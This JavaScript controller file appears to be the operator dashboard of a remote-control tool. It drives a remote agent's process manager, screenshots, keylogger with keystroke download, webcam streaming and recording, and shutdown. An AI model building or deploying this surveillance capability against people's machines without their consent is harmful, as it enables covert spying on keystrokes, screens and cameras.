import { CONFIG, state } from './config.js';
import * as Utils from './utils.js';
import * as Views from './views.js';
import { startSignalR, sendCommand } from './network.js';
import {processInputKey, renderDiskInfo} from './utils.js';

let previousObjectUrl = null;

// Kiểm tra xem phần tử có tồn tại không trước khi gán
const agentIdDisplay = document.getElementById('agent-id-display');
if (agentIdDisplay) agentIdDisplay.textContent = CONFIG.AGENT_ID;


// --- 1. CÁC HÀM CALLBACK XỬ LÝ DỮ LIỆU (BẮT BUỘC PHẢI CÓ) ---

const originalAttachViewListeners = window.attachViewListeners || function(){};

function handleResponse(data) {
    if (!data) return;

    if (data.action === 'sys_specs') {
        const specs = data.response; // Object chứa: CpuName, GpuName, ...
        
        // Helper gán text an toàn
        const setText = (id, val) => { const el = document.getElementById(id); if(el) el.textContent = val; };


        setText('spec-cpu-name', specs.cpuName);
        setText('spec-cpu-cores', specs.cpuCores);
        setText('spec-ram-total-1', specs.totalRam);
        setText('spec-ram-total-2', specs.totalRam);
        setText('spec-ram-detail', specs.ramDetail);
        setText('spec-gpu', specs.gpuName);
        setText('spec-os', specs.osName);
        setText('spec-ip', `IP: ${specs.localIp} \nMAC: ${specs.macAddress}`);
        setText('spec-uptime', `Uptime: ${specs.uptime}`);
        setText('spec-disk', renderDiskInfo(specs.diskInfo));
        
        return;
    }

    if (state.currentView === 'applications' && Array.isArray(data.response)) {
        state.globalAppData = data.response;
        sortAndRenderApp();
    } 
    else if (state.currentView === 'processes' && Array.isArray(data.response)) {
        state.globalProcessData = data.response;
        sortAndRenderProcess();
    }
    else if (data.response === 'stopped') {
        if(state.currentView === 'keylogger') {
            const status = document.getElementById('keylogger-status');
            if(status) status.textContent = "Trạng thái: Đã dừng.";
        }
        if(state.currentView === 'applications') {
            sendCommand('app_list');
            setTimeout(() => {
                sendCommand('app_list');
            }, 100);
            setTimeout(() => {
                sendCommand('app_list');
            }, 1000);
        }
        
        // Reset Webcam UI
        if(state.currentView === 'webcam') {
            // 1. Đặt cờ ngưng nhận dữ liệu
            state.webcam.isStreaming = false;

            const vid = document.getElementById('webcam-stream');
            const ph = document.getElementById('webcam-placeholder');
            const stats = document.getElementById('webcam-stats-overlay');
            
            if(vid) { 
                vid.style.display = 'none'; 
                vid.src = ""; // Xóa dữ liệu ảnh cũ
                
                // Thu hồi Blob URL cũ ngay lập tức
                if (previousObjectUrl) {
                    URL.revokeObjectURL(previousObjectUrl);
                    previousObjectUrl = null;
                }
            }
            if(ph) { ph.style.display = 'flex'; ph.innerHTML = '<i class="fas fa-video-slash fa-2x mb-2 text-slate-400"></i><br>Webcam đang tắt'; }
            if(stats) stats.style.display = 'none';
            state.webcam.currentFPS = 0;
        }
    }
    else if (data.response === 'started') {
        if(state.currentView === 'applications') setTimeout(() => sendCommand('app_list'), 500);
        if(state.currentView === 'processes') sendCommand('process_list');
    }
    else if (data.response === 'killed' && state.currentView === 'processes') {
        sendCommand('process_list');
    }
    else if (data.response === 'done' || data.response === 'ok') {
        Utils.showModal("Thông báo", "Thao tác thành công.", null, true);
    }
}

function handleRealtimeUpdate(data) {
    if (state.currentView === 'keylogger' && data.event === 'key_pressed') {
        const rawKey = data.data;

        // 1. Cập nhật Raw Log (Thô)
        const logRaw = document.getElementById('keylogger-log-raw');
        if (logRaw) {
            logRaw.value += rawKey;
            logRaw.scrollTop = logRaw.scrollHeight;
            state.keylogger.rawBuffer += rawKey;
        }

        // 2. Cập nhật Processed Log (Văn bản sạch)
        const logProcessed = document.getElementById('keylogger-log-processed');
        const modeSelect = document.getElementById('keylog-mode');
        
        if (logProcessed) {
            const currentMode = modeSelect ? modeSelect.value : 'english';
            const currentBuffer = state.keylogger.processedBuffer || "";

            // Gọi hàm xử lý thông minh
            const newText = processInputKey(currentBuffer, rawKey, currentMode);
            
            state.keylogger.processedBuffer = newText;
            logProcessed.value = newText;
            logProcessed.scrollTop = logProcessed.scrollHeight;
        }
    }
}

function handleBinaryStream(imageData, frameSize = 0, senderTicks = 0) {
    const view = state.currentView;
    const nowPerf = performance.now();

    // Xử lý Screenshot
    if (view === 'screenshot' && state.screenshotPending && imageData) {
        const img = document.getElementById('screenshot-image');
        const ph = document.getElementById('screenshot-placeholder');
        if (img) {
            // Screenshot gửi về base64 có header sẵn hoặc raw base64
            img.src = imageData.startsWith('data:') ? imageData : "data:image/jpeg;base64," + imageData;
            img.style.display = 'block';
            if(ph) ph.style.display = 'none';
            document.getElementById('save-screenshot-btn').classList.remove('hidden');
            state.screenshotPending = false;
            Utils.updateStatus("Đã nhận ảnh.", 'success');
        }
    }

    // Xử lý Webcam
    if (view === 'webcam' && imageData) {
        // QUAN TRỌNG: Kiểm tra cờ streaming. Nếu false thì bỏ qua gói tin này.
        if (state.webcam.isStreaming === false) return;

        const cam = state.webcam;
        
        cam.framesReceived++;
        cam.totalDataReceived += frameSize;
        cam.currentFrameSize = frameSize;

        if (nowPerf - cam.lastSampleTime >= CONFIG.SAMPLE_INTERVAL_MS) {
            cam.totalTimeElapsed = nowPerf - cam.lastSampleTime;
            cam.currentFPS = cam.framesReceived / (cam.totalTimeElapsed / 1000);
            updateWebcamStatsDisplay();
            cam.framesReceived = 0;
            cam.lastSampleTime = nowPerf;
        }
        cam.lastFrameTime = nowPerf;

        const video = document.getElementById('webcam-stream');
        const placeholder = document.getElementById('webcam-placeholder');
        
        if (video) {
            if (placeholder) placeholder.style.display = 'none';
            video.style.display = 'block';

            try {
                const base64Data = imageData.replace(/^data:image\/(png|jpeg|webp);base64,/, "");
                const binaryString = atob(base64Data); 
                const len = binaryString.length;
                const bytes = new Uint8Array(len);
                for (let i = 0; i < len; i++) {
                    bytes[i] = binaryString.charCodeAt(i);
                }
                const blob = new Blob([bytes], { type: "image/webp" });

                if (previousObjectUrl) {
                    URL.revokeObjectURL(previousObjectUrl);
                }

                const newUrl = URL.createObjectURL(blob);
                video.src = newUrl;
                previousObjectUrl = newUrl;
            } catch (err) {
                console.error("Blob error:", err);
            }
        }
    }
}

function updateWebcamStatsDisplay() {
    const overlay = document.getElementById('webcam-stats-overlay');
    if (!overlay) return;
    
    if (state.webcam.isStatsVisible) {
        const bitrateKBps = (state.webcam.currentFrameSize / 1024) * state.webcam.currentFPS;
        overlay.innerHTML = `
            <div class="text-sm font-mono text-white/90 p-2 space-y-0.5">
                <p>FPS: <span class="font-bold text-green-400">${state.webcam.currentFPS.toFixed(1)}</span></p>
                <p>Ping: <span class="font-bold text-green-400">${state.webcam.currentPing.toFixed(2)}</span></p>
                <p>Rate: <span class="font-bold text-purple-400">${bitrateKBps.toFixed(1)} KB/s</span></p>
                <p>Size: <span class="font-bold text-slate-300">${(state.webcam.currentFrameSize / 1024).toFixed(1)} KB</span></p>
            </div>`;
    } else {
        overlay.innerHTML = `<p class="text-white bg-red-600 text-xs px-2 py-1 rounded font-bold uppercase tracking-widest">LIVE</p>`;
    }
    overlay.style.display = 'block';
}

// --- 2. LOGIC SẮP XẾP ---

window.handleSortProcess = (column) => {
    if (state.currentSort.column === column) {
        state.currentSort.direction = state.currentSort.direction === 'asc' ? 'desc' : 'asc';
    } else {
        state.currentSort.column = column;
        state.currentSort.direction = (column === 'name') ? 'asc' : 'desc';
    }
    const container = document.getElementById('content-area');
    if(container) {
       container.innerHTML = Views.renderProcessLayout();
       attachViewListeners('processes');
    }
    sortAndRenderProcess();
};

window.handleSortApp = (column) => {
    if (state.currentAppSort.column === column) {
        state.currentAppSort.direction = state.currentAppSort.direction === 'asc' ? 'desc' : 'asc';
    } else {
        state.currentAppSort.column = column;
        state.currentAppSort.direction = 'asc';
    }
    document.getElementById('content-area').innerHTML = Views.renderAppLayout();
    attachViewListeners('applications');
    sortAndRenderApp();
};

function sortAndRenderProcess() {
    if (!state.globalProcessData) return;
    const { column, direction } = state.currentSort;
    const sorted = [...state.globalProcessData].sort((a, b) => {
        let valA, valB;
        if (column === 'pid') { valA = parseInt(a.pid); valB = parseInt(b.pid); }
        else if (column === 'name') { valA = (a.name||'').toLowerCase(); valB = (b.name||'').toLowerCase(); }
        else if (column === 'cpu') { valA = parseFloat(a.cpu?.replace('%','')||0); valB = parseFloat(b.cpu?.replace('%','')||0); }
        else if (column === 'disk') { 
            const parseDisk = (s) => {
                if(!s) return 0;
                let v = parseFloat(s.replace(/[^\d.]/g, '')) || 0;
                if(s.includes('MB/s')) v *= 1024;
                return v;
            };
            valA = parseDisk(a.disk);
            valB = parseDisk(b.disk);
        }
        else { valA = parseFloat(a.mem?.replace(/[^\d]/g,'')||0); valB = parseFloat(b.mem?.replace(/[^\d]/g,'')||0); }
        
        if (valA < valB) return direction === 'asc' ? -1 : 1;
        if (valA > valB) return direction === 'asc' ? 1 : -1;
        return 0;
    });
    Views.updateProcessTable(sorted);
}

function sortAndRenderApp() {
    if (!state.globalAppData) return;
    const { column, direction } = state.currentAppSort;
    const sorted = [...state.globalAppData].sort((a, b) => {
        let valA = (a[column] || '').toString().toLowerCase();
        let valB = (b[column] || '').toString().toLowerCase();
        
        if (valA < valB) return direction === 'asc' ? -1 : 1;
        if (valA > valB) return direction === 'asc' ? 1 : -1;
        return 0;
    });
    Views.updateAppTable(sorted);
}

// --- 3. CONTROLLER & EVENTS ---

function switchView(view) {
    state.currentView = view;
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.classList.remove('active');
        if(btn.dataset.view === view) btn.classList.add('active');
    });

    const area = document.getElementById('content-area');
    if (!area) return;
    
    let html = '';
    switch (view) {
        case 'applications': html = Views.renderAppLayout(); setTimeout(() => sendCommand('app_list'), 100); break;
        case 'processes': html = Views.renderProcessLayout(); 
            setTimeout(() => {
                sendCommand('process_list'); // Lấy danh sách tiến trình (động)
                sendCommand('sys_specs');    // Lấy thông số kỹ thuật (tĩnh) - MỚI
            }, 100); 
            break;
        case 'screenshot': html = Views.renderScreenshotView(); break;
        case 'keylogger': html = Views.renderKeyloggerDisplay(); break;
        case 'webcam': html = Views.renderWebcamControl(); break;
        case 'system': 
            html = Views.renderSystemControls(); 
            // THÊM: Gửi lệnh lấy thông số khi vào tab System
            setTimeout(() => sendCommand('sys_specs'), 100); 
            break;
    }
    
    area.innerHTML = html;
    attachViewListeners(view);
}

function attachViewListeners(view) {
    if (view === 'applications') {
        const btnRefresh = document.getElementById('list-apps-btn');
        if(btnRefresh) btnRefresh.onclick = () => {
            const tbody = document.getElementById('app-list-body');
            if(tbody) tbody.innerHTML = Utils.getLoadingRow(4);
            sendCommand('app_list');
        };
        const btnStart = document.getElementById('start-app-btn');
        const inputStart = document.getElementById('app-search name');
        if(btnStart && inputStart) {
            // Hàm xử lý gửi lệnh mở
            const handleStartApp = () => {
                const name = inputStart.value.trim();
                if (!name) {
                    alert("Vui lòng nhập tên ứng dụng (vd: chrome) hoặc đường dẫn!");
                    return;
                }

                // 1. Hiệu ứng Loading
                const originalContent = btnStart.innerHTML;
                btnStart.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
                btnStart.disabled = true;

                // 2. Gửi lệnh
                sendCommand('app_start', { name });

                // 3. Reset giao diện sau 1s (để người dùng biết đã bấm)
                setTimeout(() => {
                    btnStart.innerHTML = originalContent;
                    btnStart.disabled = false;
                    inputStart.value = ''; // Xóa ô nhập
                    
                    // Tự động làm mới danh sách sau 1.5s để thấy app chuyển trạng thái Running
                    setTimeout(() => sendCommand('app_list'), 1500);
                }, 1000);
            };

            // Sự kiện Click chuột
            btnStart.onclick = handleStartApp;

            // Sự kiện nhấn phím Enter trong ô input
            inputStart.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') handleStartApp();
            });
        }

        const tableBody = document.getElementById('app-list-body');
        if(tableBody) tableBody.addEventListener('click', (e) => {
            const stopBtn = e.target.closest('button[data-action="stop-app"]');
            const startBtn = e.target.closest('button[data-action="start-app"]');
            if (stopBtn) {
                const name = stopBtn.dataset.name || stopBtn.dataset.id;
                Utils.showModal("Dừng App", `Dừng ứng dụng "${name}"?`, () => {
                    stopBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
                    sendCommand('app_stop', { name: stopBtn.dataset.id });
                });
            }
            if (startBtn) {
                // 1. Hiển thị loading để người dùng biết đang xử lý
                startBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
                
                // 2. Gửi lệnh mở ứng dụng
                // data-id của nút Start chứa đường dẫn hoặc tên ứng dụng cần mở
                sendCommand('app_start', { name: startBtn.dataset.id });

                // 3. Tự động làm mới danh sách sau 1.5s để cập nhật trạng thái "Running"
                // (Cần delay để ứng dụng kịp khởi động và xuất hiện trong danh sách process)
                setTimeout(() => sendCommand('app_list'), 1500);
            }
        });
        const searchInput = document.getElementById('app-search');
        if (searchInput) {
            searchInput.addEventListener('keyup', (e) => {
                const term = e.target.value.toLowerCase();
                const rows = document.querySelectorAll('#app-list-body tr');
                
                rows.forEach(row => {
                    // Lấy text của cột Tên (cột đầu tiên)
                    const appName = row.querySelector('td:first-child')?.textContent.toLowerCase() || "";
                    
                    // Hiện nếu tên chứa từ khóa, ẩn nếu không chứa
                    if (appName.includes(term)) {
                        row.style.display = '';
                    } else {
                        row.style.display = 'none';
                    }
                });
            });
        }
    }
    else if (view === 'processes') {
        const btnList = document.getElementById('list-processes-btn');
        if(btnList) btnList.onclick = () => {
            document.getElementById('process-list-body').innerHTML = Utils.getLoadingRow(5);
            sendCommand('process_list');
        };
        const btnStart = document.getElementById('start-process-btn');
        if(btnStart) btnStart.onclick = () => {
             const path = prompt("Nhập đường dẫn/tên tiến trình:");
             if(path) sendCommand('process_start', { name: path });
        };
        const tableBody = document.getElementById('process-list-body');
        if(tableBody) tableBody.addEventListener('click', (e) => {
            const btn = e.target.closest('button[data-action="kill-process"]');
            if(btn) {
                const pid = btn.dataset.id;
                Utils.showModal("Kill Process", `PID ${pid}?`, () => sendCommand('process_stop', { pid: parseInt(pid) }));
            }
        });
        document.getElementById('process-search')?.addEventListener('keyup', (e) => {
            const term = e.target.value.toLowerCase();
            document.querySelectorAll('#process-list-body tr').forEach(row => {
                row.style.display = row.innerText.toLowerCase().includes(term) ? '' : 'none';
            });
        });
    }
    else if (view === 'screenshot') {
        document.getElementById('capture-screenshot-btn').onclick = () => {
            const img = document.getElementById('screenshot-image');
            img.style.display = 'none';
            document.getElementById('screenshot-placeholder').textContent = 'Đang chờ ảnh...';
            document.getElementById('screenshot-placeholder').style.display = 'block';
            document.getElementById('save-screenshot-btn').classList.add('hidden');
            state.screenshotPending = true;
            sendCommand('screenshot');
        };
        document.getElementById('save-screenshot-btn').onclick = () => {
            const src = document.getElementById('screenshot-image').src;
            if(src) {
                const link = document.createElement('a');
                link.href = src;
                link.download = `screenshot_${Date.now()}.png`;
                link.click();
            }
        };
    }
    else if (view === 'keylogger') {
        // Nút Bắt đầu/Dừng/Xóa giữ nguyên logic gửi lệnh
        document.getElementById('start-keylogger-btn').onclick = () => {
            sendCommand('keylogger_start');
            document.getElementById('keylogger-status').textContent = "Trạng thái: Đang Ghi...";
            document.getElementById('keylogger-status').className = "text-xs font-bold text-green-600 animate-pulse px-2";
        };
        document.getElementById('stop-keylogger-btn').onclick = () => {
            sendCommand('keylogger_stop');
            document.getElementById('keylogger-status').textContent = "Trạng thái: Đã dừng.";
            document.getElementById('keylogger-status').className = "text-xs font-bold text-red-600 px-2";
        };
        document.getElementById('clear-keylogger-btn').onclick = () => {
            document.getElementById('keylogger-log-raw').value = '';
            document.getElementById('keylogger-log-processed').value = '';
            state.keylogger.rawBuffer = "";
            state.keylogger.processedBuffer = "";
        };

        // --- LOGIC MỚI: Đổi chế độ gõ ---
        document.getElementById('keylog-mode').addEventListener('change', (e) => {
            state.keylogger.mode = e.target.value;
            document.getElementById('mode-indicator').textContent = e.target.value === 'telex' ? 'VN' : 'EN';
            // Lưu ý: Việc đổi chế độ không làm thay đổi văn bản ĐÃ gõ, chỉ áp dụng cho ký tự TIẾP THEO.
        });

        // --- LOGIC MỚI: Tải về ---
        document.getElementById('download-keylog-btn').onclick = () => {
            const text = state.keylogger.processedBuffer;
            if (!text) { alert("Chưa có nội dung để tải!"); return; }
            
            const blob = new Blob([text], { type: "text/plain;charset=utf-8" });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `Keylog_${new Date().toISOString().slice(0,19).replace(/[:T]/g,"-")}.txt`;
            a.click();
            URL.revokeObjectURL(url);
        };
    }
    else if (view === 'webcam') {
        document.getElementById('webcam-on-btn').onclick = () => {
            // Bật cờ streaming
            state.webcam.isStreaming = true;
            sendCommand('webcam_on');
            
            const ph = document.getElementById('webcam-placeholder');
            if (ph) {
                // Chèn HTML loader mới với class đã đổi tên
                ph.innerHTML = `
                    <div class="wc-load-wrapper">
                        <div class="wc-load-circle"></div>
                        <div class="wc-load-circle"></div>
                        <div class="wc-load-circle"></div>
                        <div class="wc-load-shadow"></div>
                        <div class="wc-load-shadow"></div>
                        <div class="wc-load-shadow"></div>
                    </div>
                    <div class="text-center mt-4 text-white">Đang kết nối...</div>
                `;
                
                // Đảm bảo container cha có Flexbox để căn giữa loader (nếu chưa có trong CSS gốc)
                ph.style.display = 'flex';
                ph.style.flexDirection = 'column';
                ph.style.justifyContent = 'center';
                ph.style.alignItems = 'center';
            }
            updateWebcamStatsDisplay();
        };
        document.getElementById('webcam-off-btn').onclick = () => sendCommand('webcam_off');
        document.getElementById('toggle-stats-btn').onclick = () => {
            state.webcam.isStatsVisible = !state.webcam.isStatsVisible;
            const btn = document.getElementById('toggle-stats-btn');
            btn.classList.toggle('bg-blue-600', state.webcam.isStatsVisible);
            btn.classList.toggle('text-white', state.webcam.isStatsVisible);
            updateWebcamStatsDisplay();
        };

        // GẮN SỰ KIỆN NÚT GHI HÌNH
        document.getElementById('record-btn').onclick = toggleRecording;

        // Xử lý khi tắt Webcam thì cũng phải tắt ghi hình luôn (nếu đang ghi)
        document.getElementById('webcam-off-btn').onclick = () => {
            if (state.webcam.isRecording) {
                toggleRecording(); // Dừng ghi và hiện bảng lưu
            }
            state.webcam.isStreaming = false;
            sendCommand('webcam_off');
        };
    }
    else if (view === 'system') {
        document.getElementById('shutdown-btn').onclick = () => Utils.showModal("CẢNH BÁO", "Tắt máy Agent?", () => sendCommand('shutdown'));
        document.getElementById('restart-btn').onclick = () => Utils.showModal("CẢNH BÁO", "Khởi động lại Agent?", () => sendCommand('restart'));
    }
}

// --- INIT ---

function doLogin(username, password) {
    const btnText = document.getElementById('btn-text');
    const btnLoader = document.getElementById('btn-loader');
    const errorMsg = document.getElementById('login-error');
    const loginBtn = document.getElementById('login-btn');
    
    // SỬA LỖI: Xóa dấu phẩy thừa ở đây
    const ipInput = document.getElementById("server-ip").value.trim(); 
    
    // Nếu để trống thì mặc định localhost
    const serverIp = ipInput || "localhost";
    const dynamicUrl = `http://${serverIp}:5000/clienthub`;

    btnText.textContent = "Đang xác thực...";
    btnLoader.classList.remove('hidden');
    errorMsg.classList.add('hidden');
    loginBtn.disabled = true;

    startSignalR(dynamicUrl, username, password, {
        onResponse: handleResponse,
        onUpdate: handleRealtimeUpdate,
        onBinary: handleBinaryStream
    })
    .then((conn) => {
        // SỬA LỖI: Nhận biến conn từ resolve
        state.connection = conn; 
        state.currentUser = username;
        
        const userDisplay = document.getElementById('user-display');
        if(userDisplay) userDisplay.textContent = `Hi, ${username}`;
        
        Utils.updateStatus("Đã kết nối an toàn", "success");
        
        // Lưu IP lại
        localStorage.setItem('saved_server_ip', serverIp);

        const loginScreen = document.getElementById('login-screen');
        const appScreen = document.getElementById('app');

        loginScreen.classList.add('opacity-0');
        setTimeout(() => {
            loginScreen.classList.add('hidden');
            appScreen.classList.remove('hidden');
            setTimeout(() => {
                appScreen.classList.remove('opacity-0');
                switchView(state.currentView);
            }, 50);
        }, 500);
    })
    .catch((err) => {
        console.warn("Login Failed:", err);
        btnText.textContent = "Đăng Nhập";
        btnLoader.classList.add('hidden');
        loginBtn.disabled = false;
        if(errorMsg) {
             errorMsg.textContent = "Lỗi kết nối hoặc sai mật khẩu!";
             errorMsg.classList.remove('hidden');
        }
    });
}

function doLogout() {
    if (state.connection) state.connection.stop();
    location.reload();
}

document.addEventListener('DOMContentLoaded', () => {
    const toggleBtn = document.getElementById('sidebar-toggle');
            const sidebar = document.getElementById('sidebar');
            
            // Logic đóng mở Sidebar
            if(toggleBtn && sidebar) {
                toggleBtn.addEventListener('click', () => {
                    sidebar.classList.toggle('sidebar-collapsed');
                    sidebar.classList.toggle('w-64');
                    
                    // Khi đóng, nút 3 gạch sẽ nằm giữa
                    if(sidebar.classList.contains('sidebar-collapsed')) {
                        // Logic CSS class đã xử lý việc ẩn text
                    }
                });
            }

            // Đổi tiêu đề khi bấm Tab
            const tabs = document.querySelectorAll('.tab-btn');
            tabs.forEach(btn => {
                btn.addEventListener('click', function() {
                    tabs.forEach(t => {
                        t.classList.remove('bg-slate-100', 'shadow-inner');
                    });
                    this.classList.add('bg-slate-100', 'shadow-inner');
                    
                    const titleMap = {
                        'applications': 'Quản lý Ứng dụng',
                        'processes': 'Giám sát Tiến trình',
                        'screenshot': 'Xem Màn hình',
                        'keylogger': 'Nhật ký Phím',
                        'webcam': 'Camera An ninh',
                        'system': 'Cấu hình Hệ thống'
                    };
                    const view = this.getAttribute('data-view');
                    const titleIcon = this.querySelector('i').className;
                    
                    // Cập nhật tiêu đề + Icon trên Header
                    const pageTitle = document.getElementById('page-title');
                    pageTitle.innerHTML = `<i class="mr-2 text-slate-500"></i> ${titleMap[view] || 'Dashboard'}`;
                });
            });

    // ... (Các event Login, Logout, Agent Select giữ nguyên) ...
    const agentSelect = document.getElementById('agent-select');
    if (agentSelect) {
        agentSelect.addEventListener('change', (e) => {
            agentId = e.target.value;
            refreshCurrentViewData();
            if (state.currentView === 'processes' || state.currentView === 'system') {
                sendCommand('sys_specs');
            }
        });
    }

    // Bind Tab Click
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.addEventListener('click', (e) => switchView(e.currentTarget.dataset.view));
    });

    // Bind Login
    const loginForm = document.getElementById('login-form');
    if(loginForm) {
        loginForm.addEventListener('submit', (e) => {
            e.preventDefault();
            doLogin(document.getElementById('username-input').value, document.getElementById('password-input').value);
        });
    }

    // Bind Logout
    const logoutBtn = document.getElementById('logout-btn');
    if(logoutBtn) logoutBtn.addEventListener('click', doLogout);
    
    // Tự động điền IP cũ
    const savedIp = localStorage.getItem('saved_server_ip');
    if (savedIp) {
        const ipField = document.getElementById('server-ip');
        if(ipField) ipField.value = savedIp;
    }

    const header = document.getElementById('main-header');
    const showHeaderBtn = document.getElementById('show-header-btn');
    const hideHeaderBtn = document.getElementById('hide-header-btn');

    if (header && showHeaderBtn && hideHeaderBtn) {
        // Sự kiện: Bấm nút Ẩn (trên Header)
        hideHeaderBtn.addEventListener('click', () => {
            // Ẩn header bằng cách set display: none hoặc slide-up
            header.style.display = 'none'; 
            // Hiện nút Floating
            showHeaderBtn.classList.remove('hidden');
        });

        // Sự kiện: Bấm nút Hiện (Floating)
        showHeaderBtn.addEventListener('click', () => {
            // Hiện lại header
            header.style.display = 'flex';
            // Ẩn nút Floating
            showHeaderBtn.classList.add('hidden');
        });
    }
});














function toggleRecording() {
    const btn = document.getElementById('record-btn');
    const timerUI = document.getElementById('recording-ui');
    const img = document.getElementById('webcam-stream');
    const canvas = document.getElementById('hidden-recorder-canvas');

    if (!state.webcam.isRecording) {
        // --- BẮT ĐẦU GHI ---
        if (!state.webcam.isStreaming || img.style.display === 'none') {
            alert("Vui lòng bật Webcam trước khi ghi hình!");
            return;
        }

        // 1. Chuẩn bị Canvas
        canvas.width = img.naturalWidth || 1280;
        canvas.height = img.naturalHeight || 720;
        const ctx = canvas.getContext('2d');

        // 2. Tạo luồng stream từ Canvas (30 FPS)
        const stream = canvas.captureStream(30);
        state.webcam.recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
        state.webcam.recordedChunks = [];

        state.webcam.recorder.ondataavailable = (e) => {
            if (e.data.size > 0) state.webcam.recordedChunks.push(e.data);
        };

        state.webcam.recorder.onstop = () => {
            showSaveVideoModal();
        };

        // 3. Vòng lặp vẽ ảnh từ <img> sang <canvas>
        // Đây là bước quan trọng để biến ảnh tĩnh thành video stream
        state.webcam.canvasDrawerInterval = setInterval(() => {
            if (img.complete && img.naturalHeight !== 0) {
                ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
            }
        }, 1000 / 30); // Vẽ 30 lần/giây

        // 4. Bắt đầu ghi
        state.webcam.recorder.start();
        state.webcam.isRecording = true;
        state.webcam.recordStartTime = Date.now();

        // 5. UI Updates
        btn.innerHTML = '<i class="fas fa-stop mr-2 text-red-600"></i> Dừng lại';
        btn.classList.add('bg-red-50', 'text-red-600', 'border-red-200');
        timerUI.classList.remove('hidden');

        // 6. Chạy đồng hồ đếm giờ
        state.webcam.recordTimerInterval = setInterval(updateRecordTimer, 1000);

    } else {
        // --- DỪNG GHI ---
        stopRecordingProcess();
        
        // UI Updates
        btn.innerHTML = '<i class="fas fa-record-vinyl mr-2 text-red-500"></i> Ghi hình';
        btn.classList.remove('bg-red-50', 'text-red-600', 'border-red-200');
        timerUI.classList.add('hidden');
    }
}

function stopRecordingProcess() {
    if (state.webcam.recorder && state.webcam.recorder.state !== 'inactive') {
        state.webcam.recorder.stop();
    }
    state.webcam.isRecording = false;
    clearInterval(state.webcam.recordTimerInterval);
    clearInterval(state.webcam.canvasDrawerInterval);
    document.getElementById('record-timer').textContent = "00:00";
}

function updateRecordTimer() {
    const elapsed = Math.floor((Date.now() - state.webcam.recordStartTime) / 1000);
    const min = String(Math.floor(elapsed / 60)).padStart(2, '0');
    const sec = String(elapsed % 60).padStart(2, '0');
    const timerEl = document.getElementById('record-timer');
    if(timerEl) timerEl.textContent = `${min}:${sec}`;
}

// --- LOGIC LƯU VIDEO (MODAL) ---

function showSaveVideoModal() {
    const modal = document.getElementById('save-video-modal');
    const nameInput = document.getElementById('video-filename');
    
    // Đặt tên mặc định theo ngày giờ
    const now = new Date();
    const defaultName = `RCS_Rec_${now.getHours()}${now.getMinutes()}_${now.getDate()}${now.getMonth()+1}`;
    nameInput.value = defaultName;
    
    modal.classList.remove('hidden');

    // Xử lý nút Lưu
    document.getElementById('confirm-save-video').onclick = () => {
        let filename = nameInput.value.trim() || defaultName;
        if (!filename.endsWith('.webm')) filename += '.webm';
        
        const blob = new Blob(state.webcam.recordedChunks, { type: 'video/webm' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        a.click();
        URL.revokeObjectURL(url);
        
        modal.classList.add('hidden');
        state.webcam.recordedChunks = []; // Dọn dẹp
    };

    // Xử lý nút Hủy
    document.getElementById('cancel-save-video').onclick = () => {
        modal.classList.add('hidden');
        state.webcam.recordedChunks = []; // Hủy bỏ video vừa quay
    };
}















function enableAutoResize(inputId) {
    const input = document.getElementById(inputId);
    if (!input) return;

    // 1. Tạo một thẻ span ẩn để đo độ rộng chữ
    // Chúng ta phải sao chép font chữ của input sang span này để đo cho chuẩn
    const measureSpan = document.createElement('span');
    measureSpan.style.visibility = 'hidden';
    measureSpan.style.position = 'absolute';
    measureSpan.style.whiteSpace = 'pre'; // Giữ nguyên khoảng trắng
    measureSpan.style.pointerEvents = 'none';
    document.body.appendChild(measureSpan);

    const updateWidth = () => {
        // Copy style font từ input sang span đo
        const styles = window.getComputedStyle(input);
        measureSpan.style.font = styles.font;
        measureSpan.style.fontSize = styles.fontSize;
        measureSpan.style.fontFamily = styles.fontFamily;
        measureSpan.style.fontWeight = styles.fontWeight;
        measureSpan.style.letterSpacing = styles.letterSpacing;

        // Lấy nội dung (nếu rỗng thì lấy placeholder để đo độ rộng tối thiểu)
        measureSpan.textContent = input.value || input.placeholder;

        // Tính toán độ rộng: Độ rộng chữ + Padding trái (icon) + Padding phải
        // 40px là padding-left (chỗ icon), 20px là padding-right dư ra cho đẹp
        const newWidth = measureSpan.offsetWidth + 60; 

        // Gán độ rộng mới
        input.style.width = `${newWidth}px`;
    };

    // Lắng nghe sự kiện gõ phím
    input.addEventListener('input', updateWidth);
    
    // Gọi 1 lần lúc đầu để setup
    updateWidth();
}

enableAutoResize('process-search');

function toggleSidebar() {
    const sidebar = document.getElementById('sidebar');
    if (!sidebar) return;

    // Kiểm tra trạng thái hiện tại (đang thu nhỏ hay mở rộng?)
    // w-20: Thu nhỏ (Collapsed)
    // w-64: Mở rộng (Expanded)
    const isCollapsed = sidebar.classList.contains('w-20');

    if (isCollapsed) {
        // MỞ RỘNG RA
        sidebar.classList.remove('w-20', 'sidebar-collapsed');
        sidebar.classList.add('w-64');
    } else {
        // THU NHỎ LẠI
        sidebar.classList.remove('w-64');
        sidebar.classList.add('w-20', 'sidebar-collapsed');
    }
}